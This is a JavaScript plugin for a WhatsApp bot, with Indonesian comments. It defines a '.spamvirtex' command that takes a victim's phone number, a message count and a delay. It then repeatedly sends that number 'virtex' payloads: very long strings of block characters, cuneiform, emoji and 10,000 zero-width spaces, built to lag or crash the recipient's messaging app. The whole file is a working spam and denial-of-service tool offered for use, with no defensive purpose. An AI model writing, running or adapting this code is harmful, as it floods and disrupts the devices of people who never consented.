// fitur/spamvirtex.js
module.exports = async (sock, msg, command, args) => {
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
  if (!args[0] || !args[1] || !args[2]) return sock.sendMessage(msg.key.remoteJid, { text: 'Contoh:\n.spamvirtex 628xxxx 5 1000' });

  const nomor = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  const jumlah = parseInt(args[1]);
  const jeda = parseInt(args[2]);

  const virtex = [];

  // 💀 Virtex 1 - full simbol acak
  virtex.push("▓▓▒▒░░█▀▄▀█ █▀▀ █▀▀ █▄░█ ░░▒▒▓▓▒▒░░ ▓▓▒▒░░▄█▀▀█░░▒▒▓▓ █▄▄█ ▄▀█ ▄▀▀ █░▀█ ▓▓▒▒░░░░░░░░▒▒▓▓".repeat(20));

  // 💀 Virtex 2
  virtex.push("𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜𒆜".repeat(40));

  // 💀 Virtex 3
  virtex.push("乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂乂".repeat(50));

  // 💀 Virtex 4
  virtex.push("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓".repeat(40));

  // 💀 Virtex 5
  virtex.push("👹👺💀☠️👻😈🔥⚡💣💥🧨".repeat(80));

  // 💀 Virtex 6
  virtex.push("▒█▀▀█ █▀▀ █░░█ ▀▀█▀▀ █▀▀ █▀▀▄ █▀▀▄ ░▒█▀▀█ █░░█ █▀▀▄".repeat(25));

  // 💀 Virtex 7
  virtex.push("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░".repeat(50));

  // 💀 Virtex 8 - blank but large
  virtex.push("\u200b".repeat(10000));

  // 💀 Virtex 9
  virtex.push("🅑🅡🅤🅣🅐🅛 🅥🅘🅡🅣🅔🅧".repeat(30));

  // 💀 Virtex 10
  virtex.push("【﻿ＶＩＲＴＥＸ】".repeat(60));

  // 💀 Virtex 11–25 — variasi brutal
  for (let i = 11; i <= 25; i++) {
    virtex.push(
      ("💢".repeat(100) + "𓂀𓆩𓆧𓂸𓁷𓆣𓆏𓄿".repeat(50) + "🛑⚠️💥".repeat(30) + "\n").repeat(4)
    );
  }

  for (let i = 0; i < jumlah; i++) {
    const teks = virtex[Math.floor(Math.random() * virtex.length)];
    await sock.sendMessage(nomor, { text: teks });
    await delay(jeda);
  }

  sock.sendMessage(msg.key.remoteJid, { text: `✅ Terkirim ${jumlah} virtex ke ${args[0]}` });
};
